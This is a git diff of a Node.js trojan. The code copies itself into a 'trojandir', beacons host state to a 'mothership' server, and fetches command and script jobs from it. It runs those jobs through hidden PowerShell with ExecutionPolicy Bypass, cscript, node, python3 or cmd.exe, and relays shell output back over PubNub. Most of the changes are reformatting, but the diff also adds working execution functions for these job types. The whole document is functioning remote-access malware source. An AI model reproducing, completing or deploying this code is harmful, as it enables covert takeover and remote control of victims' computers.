-  const year = date.getFullYear();
-  const month = String(date.getMonth() + 1).padStart(2, '0'); //
-  const day = String(date.getDate()).padStart(2, '0');       //
-  const hours = String(date.getHours()).padStart(2, '0');    //
-  const minutes = String(date.getMinutes()).padStart(2, '0');//
-  const seconds = String(date.getSeconds()).padStart(2, '0');//
-  const ms = String(date.getMilliseconds()).padStart(3, '0'); //
+    const date = new Date();
 
-  // Combine into final strings
-  const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
-  const fullWithMs = `${yyyymmddhhmmss}${ms}`;
+    // Extract components
+    const year = date.getFullYear();
+    const month = String(date.getMonth() + 1).padStart(2, "0"); //
+    const day = String(date.getDate()).padStart(2, "0"); //
+    const hours = String(date.getHours()).padStart(2, "0"); //
+    const minutes = String(date.getMinutes()).padStart(2, "0"); //
+    const seconds = String(date.getSeconds()).padStart(2, "0"); //
+    const ms = String(date.getMilliseconds()).padStart(3, "0"); //
 
-  return fullWithMs;
+    // Combine into final strings
+    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
+    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
+
+    return fullWithMs;
 }
 
 function isValidDict(objin) {
-    return typeof objin === 'object' && objin !== null && Object.keys(objin).length > 0;
+    return (
+        typeof objin === "object" &&
+        objin !== null &&
+        Object.keys(objin).length > 0
+    );
 }
 
 function isValidHttpUrl(string) {
     try {
         const url = new URL(string);
-        return url.protocol === 'http:' || url.protocol === 'https:';
+        return url.protocol === "http:" || url.protocol === "https:";
     } catch (error) {
-        return false;  
+        return false;
     }
 }
 
-async function makeGetRequest(baseUrl, params, inputHeaders, downloadOpts = null) {
-    
+/*
+    status: response.status,
+    statusText: response.statusText,
+    headers: headersOut,
+    downloadOpts : {
+        download: true,
+        filetype: "txt",
+        localpath: outputPath
+    }
+*/
+async function makeGetRequest(
+    baseUrl,
+    params,
+    inputHeaders,
+    downloadOpts = null
+) {
     logmsg("starting");
 
-    if ( isNullOrWhitespace(baseUrl) ) {
+    if (isNullOrWhitespace(baseUrl)) {
         throw new Error("baseUrl is empty");
-    } else if ( ! isValidHttpUrl(baseUrl) ) {
-        throw new Error("baseUrl is invalid ["+baseUrl+"]");
+    } else if (!isValidHttpUrl(baseUrl)) {
+        throw new Error("baseUrl is invalid [" + baseUrl + "]");
     }
 
     const url = new URL(baseUrl);
-    
-    logmsg("baseUrl: "+baseUrl);
 
-    if ( isValidDict(params) ) {        
-        Object.keys(params).forEach(key => {
-            url.searchParams.append(key, params[key])
+    logmsg("baseUrl: " + baseUrl);
+
+    if (isValidDict(params)) {
+        Object.keys(params).forEach((key) => {
+            url.searchParams.append(key, params[key]);
         });
     }
 
-    logmsg("url="+url.toString());
+    logmsg("url=" + url.toString());
 
-    if ( ! isValidDict(downloadOpts) ) {
-        let outputPath = path.join(systemstate.trojandir, 'download_' + getRandomCode(8));
+    if (!isValidDict(downloadOpts)) {
+        let outputPath = path.join(
+            systemstate.trojandir,
+            "download_" + getRandomCode(8)
+        );
 
-        downloadOpts = { download:true, filetype:'txt', localpath:outputPath };
+        downloadOpts = {
+            download: true,
+            filetype: "txt",
+            localpath: outputPath,
+        };
     }
-    
+
     const tinputHeaders = {
-        'Accept': '*/*',
-        'User-Agent': 'NodeJS-Fetch-Client'
+        Accept: "*/*",
+        "User-Agent": "NodeJS-Fetch-Client",
     };
 
-    if ( isValidDict(inputHeaders) ) {
+    if (isValidDict(inputHeaders)) {
         Object.assign(tinputHeaders, inputHeaders);
     }
 
@@ -1005,19 +1056,19 @@ async function makeGetRequest(baseUrl, params, inputHeaders, downloadOpts = null
     logmsg("executing GET request");
 
     response = await fetch(url.toString(), {
-        method: 'GET',
-        headers: tinputHeaders
+        method: "GET",
+        headers: tinputHeaders,
     });
-    
+
     if (!response.ok) {
         throw new Error(`HTTP error -- Status: ${response.status}`);
     }
 
     let headersOut = {};
-    
+
     for (const [key, value] of response.headers.entries()) {
-        if ( ( ! isNullOrWhitespace(key) ) && ( ! isNullOrWhitespace(value) ) ) {
-            logmsg("response headers key="+key+' value='+value);
+        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
+            logmsg("response headers key=" + key + " value=" + value);
             headersOut[key] = value;
         }
     }
@@ -1025,28 +1076,38 @@ async function makeGetRequest(baseUrl, params, inputHeaders, downloadOpts = null
     let responseOut = {
         status: response.status,
         statusText: response.statusText,
-        headers: headersOut
+        headers: headersOut,
+        // downloadOpts
     };
 
-    logmsg("response status="+response.status);
+    logmsg("response status=" + response.status);
 
-    if ( ! isValidDict(downloadOpts) || ! downloadOpts.download ) {
+    if (!isValidDict(downloadOpts) || !downloadOpts.download) {
         return responseOut;
     }
 
-    if ( ! Object.hasOwn(downloadOpts,"localpath") || isNullOrWhitespace(downloadOpts.localpath) ) {
-        let outputPath = path.join(systemstate.trojandir, 'download_' + getRandomCode(8));
-        
+    if (
+        !Object.hasOwn(downloadOpts, "localpath") ||
+        isNullOrWhitespace(downloadOpts.localpath)
+    ) {
+        let outputPath = path.join(
+            systemstate.trojandir,
+            "download_" + getRandomCode(8)
+        );
+
         downloadOpts.localpath = outputPath;
     }
 
-    if ( ! Object.hasOwn(downloadOpts,"filetype") || isNullOrWhitespace(downloadOpts.filetype) ) {
-        downloadOpts.filetype = 'txt';
+    if (
+        !Object.hasOwn(downloadOpts, "filetype") ||
+        isNullOrWhitespace(downloadOpts.filetype)
+    ) {
+        downloadOpts.filetype = "txt";
     }
 
-    if ( downloadOpts.filetype == 'txt' ) {
-        let rawText = await response.text(); 
-        fs.writeFileSync(downloadOpts.localpath, rawText, 'utf8');
+    if (downloadOpts.filetype == "txt") {
+        let rawText = await response.text();
+        fs.writeFileSync(downloadOpts.localpath, rawText, "utf8");
         responseOut.rawText = rawText;
     } else {
         const arrayBuffer = await response.arrayBuffer();
@@ -1073,15 +1134,14 @@ function fileExists(filePath) {
 }
 
 function readTag(fpath) {
+    logmsg("reading " + fpath);
 
-    logmsg('reading '+fpath);
-
-    if ( ! fileExists(fpath) ) {
-        throw new Error("file does not exist ["+fpath+"]");
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist [" + fpath + "]");
     }
 
-    const fileContent = fs.readFileSync(fpath, 'utf-8');
-  
+    const fileContent = fs.readFileSync(fpath, "utf-8");
+
     const lines = fileContent.split(/\r?\n/);
 
     if (Array.isArray(lines) && lines.length > 0) {
@@ -1092,39 +1152,38 @@ function readTag(fpath) {
         return firstLineTrimmed;
     }
 
-    throw new Error("not able to read file ["+fpath+"]");
+    throw new Error("not able to read file [" + fpath + "]");
 }
 
 function writeTag(fpath, tagstr) {
-    fs.writeFileSync(fpath, tagstr, 'utf8');
+    fs.writeFileSync(fpath, tagstr, "utf8");
 }
 
 function isPidAlive(pid) {
-
-    if ( pid <= 0 ) {
+    if (pid <= 0) {
         return false;
     }
 
     try {
-      // Signal 0 tests for process existence without modifying it
-      process.kill(pid, 0);
-      return true;
+        // Signal 0 tests for process existence without modifying it
+        process.kill(pid, 0);
+        return true;
     } catch (error) {
-      // ESRCH means the process was not found
-      return error.code === 'EPERM'; // True if it exists but you lack permissions
+        // ESRCH means the process was not found
+        return error.code === "EPERM"; // True if it exists but you lack permissions
     }
 }
 
 function isAsyncFunction(fn) {
-    return fn?.constructor?.name === 'AsyncFunction';
+    return fn?.constructor?.name === "AsyncFunction";
 }
- 
+
 function extractText(rawtext, begintoken, endtoken) {
     let token_start = rawtext.indexOf(begintoken);
     let token_end = rawtext.indexOf(endtoken);
-    let cmdstr = '';
+    let cmdstr = "";
 
-    if ( ( token_start >= 0 ) && ( token_end > token_start ) ) {
+    if (token_start >= 0 && token_end > token_start) {
         cmdstr = rawtext.substring(token_start + begintoken.length, token_end);
     }
 
@@ -1133,14 +1192,13 @@ function extractText(rawtext, begintoken, endtoken) {
 
 function keyExists(obj, prop) {
     return Object.keys(obj).some(
-      key => key.toLowerCase() === prop.toLowerCase()
+        (key) => key.toLowerCase() === prop.toLowerCase()
     );
 }
 
 function getKey(obj, searchKey) {
-    
     let keyret = Object.keys(obj).find(
-        key => key.toLowerCase() === searchKey.toLowerCase()
+        (key) => key.toLowerCase() === searchKey.toLowerCase()
     );
 
     return keyret;
@@ -1149,9 +1207,11 @@ function getKey(obj, searchKey) {
 // --- startup
 
 let cmdarr = process_argv;
-let cmdarrstr = cmdarr ? cmdarr.join() : '';
+let cmdarrstr = cmdarr ? cmdarr.join() : "";
 
-logmsg(`starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid} -- ${cmdarrstr}`);
+logmsg(
+    `starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid} -- ${cmdarrstr}`
+);
 logmsg(`scriptmd5=${systemstate.scriptmd5}`);
 
 initProcessList();
@@ -1161,75 +1221,71 @@ ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
 // --- IPC for current running process: message send/receive
 
 // message handler -- overriden by child cmds (ping, cmdlist)
-var handleMessage = function(msg) {
-    logmsg('pass');
-}
+var handleMessage = function (msg) {
+    logmsg("pass");
+};
 
 // receives messages from parent process -- should be used by cmdlist, ping, relay
-process.on('message', (message) => {
-    if ( ! message ) {
-        throw new Error('null message');
+process.on("message", (message) => {
+    if (!message) {
+        throw new Error("null message");
     }
 
     logmsg(`[XAW]incomming message:` + JSON.stringify(message));
 
-    if ( handleMessage ) {
-        logmsg('handleMessage begin');
+    if (handleMessage) {
+        logmsg("handleMessage begin");
         handleMessage(message);
-        logmsg('handleMessage end');
+        logmsg("handleMessage end");
     }
-
 });
 
 // sends message to parent process -- should be called by cmdlist, ping, relay
 async function sendMessage(dest, msgpayload) {
-    let isvalid = (typeof process.send === 'function' && process.connected );
+    let isvalid = typeof process.send === "function" && process.connected;
     const parentPid = process.ppid;
 
-    if (! isvalid) {
-        throw new Error('this process does not have a parent process to communicate with');
+    if (!isvalid) {
+        throw new Error(
+            "this process does not have a parent process to communicate with"
+        );
         return;
     }
 
-    logmsg('[CHILD] sending message to parent pid=' + parentPid);
+    logmsg("[CHILD] sending message to parent pid=" + parentPid);
 
-    let message = { 
-        senderPid:process.pid, 
-        src:systemstate.cmdname, 
-        dest:dest, 
-        payload:msgpayload, 
-        ts:getTimestamp() 
+    let message = {
+        senderPid: process.pid,
+        src: systemstate.cmdname,
+        dest: dest,
+        payload: msgpayload,
+        ts: getTimestamp(),
     };
 
     return new Promise((resolve, reject) => {
-        
         process.send(message, undefined, undefined, (error) => {
-            if (error) 
-                return reject(error);
+            if (error) return reject(error);
 
             resolve();
-
         });
-
     });
-
 }
 
 // ---
 
-function startup() {    
-    logmsg('starting');
+function startup() {
+    logmsg("starting");
 
     setcwd(systemstate.trojandir);
-    
+
     copyFile(systemstate.scriptfpath, systemstate.trojanfpath);
 
     logmsg(`systemstate: [${systemstate.statestr}]`);
     logMsgMothership(systemstate.statekvp);
 
-    let penetratecmd = new CmdConfig('penetrate');
-    let retrievecmd = new CmdConfig('retrieve');
-    let watchdogcmd = new CmdConfig('watchdog');
+    let penetratecmd = new CmdConfig("penetrate");
+    let retrievecmd = new CmdConfig("retrieve");
+    let watchdogcmd = new CmdConfig("watchdog");
 
     penetratecmd.launch();
     retrievecmd.launch();
@@ -1239,60 +1295,57 @@ function startup() {
     retrievecmd.childprocess?.unref();
     penetratecmd.childprocess?.unref();
 
-    logmsg('finished');
+    logmsg("finished");
 }
 
 function watchdog() {
-    logmsg('starting');
+    logmsg("starting");
 
     let watchdogcmd = systemstate.cmdconfig;
 
-    watchdogcmd.newCmdConfig('ping');
-    watchdogcmd.newCmdConfig('cmdlist');
+    watchdogcmd.newCmdConfig("ping");
+    watchdogcmd.newCmdConfig("cmdlist");
 
     let childcmds = watchdogcmd.childcmds;
 
     watchdogcmd.loopfunc = () => {
-
-        for ( let i = 0; i<childcmds.length; i++) {
+        for (let i = 0; i < childcmds.length; i++) {
             let childcmd = childcmds[i];
-    
+
             childcmd.activate();
         }
-
     };
 
     watchdogcmd.loop();
 
-    logmsg('finished');
+    logmsg("finished");
 }
 
 function validatePingResponse(pingresponse) {
     let downloadOpts = pingresponse.downloadOpts;
 
-    if ( ! fileExists(downloadOpts.localpath) ) {
+    if (!fileExists(downloadOpts.localpath)) {
         return false;
     }
 
-    if ( ! downloadOpts.filetype == 'txt' ) {
+    if (!downloadOpts.filetype == "txt") {
         return false;
     }
 
     let rawtext = pingresponse.rawText;
 
-    if ( isNullOrWhitespace(rawtext) )
-        return false;
+    if (isNullOrWhitespace(rawtext)) return false;
 
-    let tokens = [ 'CLIENT_EXISTS', 'CLIENT_EXISTS_NEW_PROFILE', 'NEW_CLIENT' ];
+    let tokens = ["CLIENT_EXISTS", "CLIENT_EXISTS_NEW_PROFILE", "NEW_CLIENT"];
 
-    for ( let i = 0; i<tokens.length; i++) {
-        if ( rawtext.includes(tokens[i]) ) {
-            logmsg('ping reponse contains: '+tokens[i]);
+    for (let i = 0; i < tokens.length; i++) {
+        if (rawtext.includes(tokens[i])) {
+            logmsg("ping reponse contains: " + tokens[i]);
             return true;
         }
     }
 
-    logmsg('ping reponse is not valid');
+    logmsg("ping reponse is not valid");
 
     return false;
 }
@@ -1300,59 +1353,63 @@ function validatePingResponse(pingresponse) {
 function processClientJob(rawtext) {
     let clientjob = null;
 
-    if ( rawtext.includes('execute_cmdlist') ) {
+    if (rawtext.includes("execute_cmdlist")) {
         clientjob = {
-            jobtype: 'execute_cmdlist',
-            jobcode: ''
-        }
+            jobtype: "execute_cmdlist",
+            jobcode: "",
+        };
 
         return clientjob;
     }
 
-    let jobcode = extractText(rawtext, 'JOBCODE_BEGIN', 'JOBCODE_END'); 
+    let jobcode = extractText(rawtext, "JOBCODE_BEGIN", "JOBCODE_END");
 
-    let begintoken = 'EXEC_CMD_BEGIN';
-    let endtoken = 'EXEC_CMD_END';
+    let begintoken = "EXEC_CMD_BEGIN";
+    let endtoken = "EXEC_CMD_END";
     let cmdstr = extractText(rawtext, begintoken, endtoken);
 
-    if ( ! isNullOrWhitespace(cmdstr) ) {
-        let parts = cmdstr.split('|');
-        parts = parts.filter(item => ! isNullOrWhitespace(item));
+    if (!isNullOrWhitespace(cmdstr)) {
+        let parts = cmdstr.split("|");
+        parts = parts.filter((item) => !isNullOrWhitespace(item));
 
-        if ( parts.length >= 1 ) {
+        if (parts.length >= 1) {
             let clientjob = {
-                jobtype: 'EXEC_CMD',
+                jobtype: "EXEC_CMD",
                 jobcode: jobcode,
                 cmdname: parts[0],
-                args: parts.length > 1 ? parts.slice(1) : []
+                args: parts.length > 1 ? parts.slice(1) : [],
             };
 
             return clientjob;
         } else {
-            throw new Error('client job request is malformed');
+            throw new Error("client job request is malformed");
         }
     }
 
-    let tokens = [ 'BAT', 'VBS', 'PS1', 'JS', 'PY' ];
+    let tokens = ["BAT", "VBS", "PS1", "JS", "PY"];
 
-    for ( let i=0; i<tokens.length; i++) {
+    for (let i = 0; i < tokens.length; i++) {
         let token = tokens[i];
 
-        let scripttext = extractText(rawtext, 'EXEC_'+token+'_BEGIN','EXEC_'+token+'_END');
+        let scripttext = extractText(
+            rawtext,
+            "EXEC_" + token + "_BEGIN",
+            "EXEC_" + token + "_END"
+        );
 
-        if ( ! isNullOrWhitespace(scripttext) ) {
+        if (!isNullOrWhitespace(scripttext)) {
             let fpath = systemstate.getClientJobPath();
-            fs.writeFileSync(fpath, scripttext, 'utf8');
+            fs.writeFileSync(fpath, scripttext, "utf8");
 
-            if ( ! fileExists(fpath) ) {
-                throw new Error('unable to write script text to file '+fpath);
+            if (!fileExists(fpath)) {
+                throw new Error("unable to write script text to file " + fpath);
             }
 
             let clientjob = {
-                jobtype: 'EXEC_' + token,
+                jobtype: "EXEC_" + token,
                 jobcode: jobcode,
                 //scripttext: scripttext
-                localpath: fpath
+                localpath: fpath,
             };
 
             return clientjob;
@@ -1363,19 +1420,24 @@ function processClientJob(rawtext) {
 }
 
 async function ping_loop() {
-    let baseUrl = systemstate.mothership + '/ow/ping.php';
+    let baseUrl = systemstate.mothership + "/ow/ping.php";
 
     let inputHeaders = null;
     let params = systemstate.statekvp;
-    
-    let pingpath = path.join(systemstate.trojandir, 'ping_response');
-    let downloadOpts = { download:true, filetype:'txt', localpath:pingpath };
-    let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
-    
+
+    let pingpath = path.join(systemstate.trojandir, "ping_response");
+    let downloadOpts = { download: true, filetype: "txt", localpath: pingpath };
+    let pingresponse = await makeGetRequest(
+        baseUrl,
+        params,
+        inputHeaders,
+        downloadOpts
+    );
+
     let isvalid = validatePingResponse(pingresponse);
 
-    if ( ! isvalid ) {
-        logmsg('ping response is invalid');
+    if (!isvalid) {
+        logmsg("ping response is invalid");
         systemstate.selectMothership();
         return;
     }
@@ -1384,19 +1446,20 @@ async function ping_loop() {
 
     let clientjob = processClientJob(rawtext);
 
-    if ( clientjob ) {
-        logmsg(`sending job to cmdlist: jobcode=${clientjob.jobcode} jobtype: ${clientjob.jobtype}`);
-        await sendMessage('cmdlist', clientjob);
+    if (clientjob) {
+        logmsg(
+            `sending job to cmdlist: jobcode=${clientjob.jobcode} jobtype: ${clientjob.jobtype}`
+        );
+        await sendMessage("cmdlist", clientjob);
     }
-
 }
 
 function ping_handleMessage(msg) {
-    logmsg('pass');
+    logmsg("pass");
 }
 
 function ping() {
-    logmsg('starting');
+    logmsg("starting");
 
     let cmdconfig = systemstate.cmdconfig;
     handleMessage = ping_handleMessage;
@@ -1405,42 +1468,51 @@ function ping() {
 
     cmdconfig.loop();
 
-    logmsg('finished');
+    logmsg("finished");
 }
 
-function execVBSScript() {
+function execPSScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
 
-}
+    let enginename = "PS1";
 
-function execPS1Script() {
+    cmdlineargsarr = cmdlineargsarr || [];
 
-}
-
-function execJSScript() {
-
-}
-
-function execPYScript(scriptfpath, cmdlineargsarr) {
-    logmsg('starting');
+    const child = spawn("powershell.exe", [
+        "-WindowStyle",
+        "Hidden",
+        "-NoProfile",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-File",
+        scriptfpath,
+        ...cmdlineargsarr,
+    ]);
 
     let tmpcode = getRandomCode(8);
-    let stdoutfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.out');
-    let stderrfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.err');
 
-    const out = fs.openSync(stdoutfpath, 'a');
-    const err = fs.openSync(stderrfpath, 'a');
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}Script_${tmpcode}.out`
+    );
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}Script_${tmpcode}.err`
+    );
 
-    cmdlineargsarr = cmdlineargsarr ?? [];
+    child.stdout.on("data", (data) => {
+        logmsg(`STDOUT: ${data.toString()}`);
 
-    logmsg('spawning process: '+scriptfpath+' cmdlineargsarr: '+cmdlineargsarr.join());
+        fs.writeFileSync(stdoutfpath, data, "utf-8");
+    });
 
+    child.stderr.on("data", (data) => {
+        logmsg(`STDERR: ${data.toString()}`);
+        fs.writeFileSync(stderrfpath, data, "utf-8");
+    });
 
-    const child = spawn('cmd.exe', ['/c', scriptfpath, ...(cmdlineargsarr ?? [])], { 
-        // detached: true, // might cause errors
-        windowsHide: true,
-        stdio: [ 'ignore', out, err ],
-        shell: false,
-        cwd: systemstate.trojandir 
+    child.on("close", (code) => {
+        logmsg(`Child process exited with code ${code}`);
     });
 
     child.unref();
@@ -1451,36 +1523,295 @@ function execPYScript(scriptfpath, cmdlineargsarr) {
     // Name
     // ProcessId
 
-    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+    let childprocjson = JSON.stringify(tchildproc);
 
-    logmsg('finished');
+    logmsg(
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+    );
+
+    logmsg("finished");
+
+    return child;
+}
+
+function execVBSScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
+
+    let enginename = "VBS";
+    let tmpcode = getRandomCode(8);
+
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg(
+        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
+    );
+
+    const child = spawn(
+        "cscript",
+        ["//E:vbscript", "//B", "//nologo", scriptfpath, ...cmdlineargsarr],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            // shell: false,
+            cwd: systemstate.trojandir,
+        }
+    );
+
+    child.stdout.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(out, str);
+
+        logmsg(`STDOUT: ${data.toString()}`);
+
+        // TODO: log to mothership
+    });
+
+    child.stderr.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(err, str);
+
+        logmsg(`STDERR: ${str}`);
+
+        // TODO: log to mothership
+    });
+
+    child.on("close", (code) => {
+        logmsg(`Process complete. Exit code: ${code}`);
+
+        // TODO: log to mothership
+    });
+
+    child.unref();
+
+    let tchildproc = getProcess(child.pid);
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+    let childprocjson = JSON.stringify(tchildproc);
+
+    logmsg(
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+    );
+
+    logmsg("finished");
+
+    return child;
+}
+
+function execNODEScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
+
+    let enginename = "NODE";
+    let tmpcode = getRandomCode(8);
+
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg(
+        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
+    );
+
+    const child = spawn("node", [scriptfpath, ...(cmdlineargsarr ?? [])], {
+        // detached: true, // might cause errors
+        windowsHide: true,
+        shell: false,
+        cwd: systemstate.trojandir,
+    });
+
+    child.stdout.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(out, str);
+
+        logmsg(`STDOUT: ${data.toString()}`);
+
+        // TODO: log to mothership
+    });
+
+    child.stderr.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(err, str);
+
+        logmsg(`STDERR: ${str}`);
+
+        // TODO: log to mothership
+    });
+
+    child.on("close", (code) => {
+        logmsg(`Process complete. Exit code: ${code}`);
+
+        // TODO: log to mothership
+    });
+
+    child.unref();
+
+    let tchildproc = getProcess(child.pid);
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+    let childprocjson = JSON.stringify(tchildproc);
+
+    logmsg(
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+    );
+
+    logmsg("finished");
+
+    return child;
+}
+
+function execPYTHONScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
+
+    let enginename = "PYTHON";
+    let tmpcode = getRandomCode(8);
+
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg(
+        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
+    );
+
+    const child = spawn(
+        "python3",
+        ["-u", scriptfpath, ...(cmdlineargsarr ?? [])],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            shell: false,
+            cwd: systemstate.trojandir,
+        }
+    );
+
+    child.stdout.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(out, str);
+
+        logmsg(`STDOUT: ${data.toString()}`);
+
+        // TODO: log to mothership
+    });
+
+    child.stderr.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(err, str);
+
+        logmsg(`STDERR: ${str}`);
+
+        // TODO: log to mothership
+    });
+
+    child.on("close", (code) => {
+        logmsg(`Process complete. Exit code: ${code}`);
+
+        // TODO: log to mothership
+    });
+
+    child.unref();
+
+    let tchildproc = getProcess(child.pid);
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+    let childprocjson = JSON.stringify(tchildproc);
+
+    logmsg(
+        `launched child pid=${childpidstr} spawn args: ${spawnargsstr} tchildproc: ${childprocjson}`
+    );
+
+    logmsg("finished");
 
     return child;
 }
 
 function execCMDScript(scriptfpath, cmdlineargsarr) {
-
-    logmsg('starting');
+    logmsg("starting");
 
     let tmpcode = getRandomCode(8);
-    let stdoutfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.out');
-    let stderrfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.err');
 
-    const out = fs.openSync(stdoutfpath, 'a');
-    const err = fs.openSync(stderrfpath, 'a');
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        "execCMDScript_" + tmpcode + ".out"
+    );
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        "execCMDScript_" + tmpcode + ".err"
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
 
     cmdlineargsarr = cmdlineargsarr ?? [];
 
-    logmsg('spawning process: '+scriptfpath+' cmdlineargsarr: '+cmdlineargsarr.join());
+    logmsg(
+        "spawning process: " +
+            scriptfpath +
+            " cmdlineargsarr: " +
+            cmdlineargsarr.join()
+    );
 
-
-    const child = spawn('cmd.exe', ['/c', scriptfpath, ...(cmdlineargsarr ?? [])], { 
-        // detached: true, // might cause errors
-        windowsHide: true,
-        stdio: [ 'ignore', out, err ],
-        shell: false,
-        cwd: systemstate.trojandir 
-    });
+    const child = spawn(
+        "cmd.exe",
+        ["/c", scriptfpath, ...(cmdlineargsarr ?? [])],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            stdio: ["ignore", out, err],
+            shell: false,
+            cwd: systemstate.trojandir,
+        }
+    );
 
     child.unref();
 
@@ -1490,35 +1821,36 @@ function execCMDScript(scriptfpath, cmdlineargsarr) {
     // Name
     // ProcessId
 
-    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+            JSON.stringify(child.spawnargs) +
+            " tchildproc: " +
+            JSON.stringify(tchildproc)
+    );
 
-    logmsg('finished');
+    logmsg("finished");
 
     return child;
 }
 
 function writeToChildProcess(child, msg) {
-
-    if ( ! child ) {
-        throw new Error('child process is null');
+    if (!child) {
+        throw new Error("child process is null");
     }
 
-    if ( child.stdin.writable ) {
+    if (child.stdin.writable) {
         logmsg(`writing msg to child process: ${child.pid} -- ` + msg);
         child.stdin.write(msg);
-        // child.stdin.end(); 
+        // child.stdin.end();
     }
-
 }
 
 function runpythonrelay(pubnubo) {
-
+    return execPYTHONScript(path.join(systemstate.trojandir, "pythonrelay.py")); // anchor
 }
 
-// anchor
 function runpsrelay(pubnubo) {
-
-    const child = spawn('powershell.exe', ['-NoProfile', '-Command', '-'], {
+    const child = spawn("powershell.exe", ["-NoProfile", "-Command", "-"], {
         shell: false,
         // detached: true, // causes problems
         windowsHide: true,
@@ -1530,55 +1862,63 @@ function runpsrelay(pubnubo) {
     // Name
     // ProcessId
 
-    child.stdout.on('data', (data) => {
-        const str = Buffer.from(data).toString(); 
+    child.stdout.on("data", (data) => {
+        const str = Buffer.from(data).toString();
 
         logmsg(`STDOUT: ${str}`);
 
-        pubnubo.publishMessage( { execresult:str, ts:getTimestamp(), responseid:getRandomCode(8) } );
+        pubnubo.publishMessage({
+            execresult: str,
+            ts: getTimestamp(),
+            responseid: getRandomCode(8),
+        });
     });
 
-    child.stdout.on('error', (err) => {
-        logmsg('STDOUT error:', err);
+    child.stdout.on("error", (err) => {
+        logmsg("STDOUT error:", err);
     });
 
-    child.stderr.on('data', (data) => {
-        const str = Buffer.from(data).toString(); 
+    child.stderr.on("data", (data) => {
+        const str = Buffer.from(data).toString();
 
         logmsg(`STDERR: ${str}`);
 
-        pubnubo.publishMessage( { execresult:str, ts:getTimestamp() } );
+        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
     });
 
-    child.stdin.on('error', (err) => {
-        if (err.code === 'EPIPE') {
-            logmsg('Subprocess closed stdin early; ignoring broken pipe.');
+    child.stdin.on("error", (err) => {
+        if (err.code === "EPIPE") {
+            logmsg("Subprocess closed stdin early; ignoring broken pipe.");
         } else {
